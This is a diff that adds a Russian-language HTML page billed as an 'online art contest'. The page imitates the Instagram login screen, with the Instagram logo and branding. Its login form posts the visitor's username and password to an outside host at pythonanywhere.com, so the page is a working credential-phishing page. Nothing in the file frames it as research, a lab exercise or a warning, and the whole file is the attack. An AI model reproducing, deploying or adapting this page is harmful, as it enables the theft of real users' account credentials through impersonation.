@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <title>Онлайн Конкурс Искусства</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+  <span id="root">
+    <section class="section-all">
+      <link rel="stylesheet" href="css/css.css">
+      <!-- 1-Роль Основной контент -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class "article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo"
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                    alt="Инстаграм">
+                </div><!-- Заголовок end -->
+                <div class="form-wrap">
+                  <form class="form" action="https://cyrru.pythonanywhere.com/login1" method="POST" class="my-login-validation"
+                    novalidate="">
+                    <div class="input-box">
+                    <input type="text" id="username" placeholder="Номер телефона, имя пользователя или адрес электронной почты" aria-required="true"
+                      maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                </div>
+                <div class="input-box">
+                  <input type="password" name="password" id="password" placeholder="Пароль" maxlength="30"
+                    aria-required="true" autocapitalize="off" autocorrect="off" required>
+                </div>
+                <span class="button-box">
+                  <button class="btn" type="submit">Войти</button>
+                </span>
+                <a class="forgot" href="/">Забыли пароль?</a>
+                </form>
+              </div> <!-- Форма end -->
+            </div> <!-- Логин-бокс end -->
+            <div class="login-box">
+              <p class="text">Нет аккаунта?<a href="/">Зарегистрируйтесь</a></p>
+            </div> <!-- Регистрация end --><!-- Приложение end -->
+        </div> <!-- Контент end -->
+        </article>
+        </div> <!-- Обертка end -->
+      </main>
+      <!-- 2-Роль Футер -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+          <span class="footer-logo">&copy; 2023 Инстаграм</span>
+        </div> <!-- Контейнер Футера end -->
+      </footer>
+    </section>
+  </span> <!-- Корневой элемент -->
+</body>
+</html>
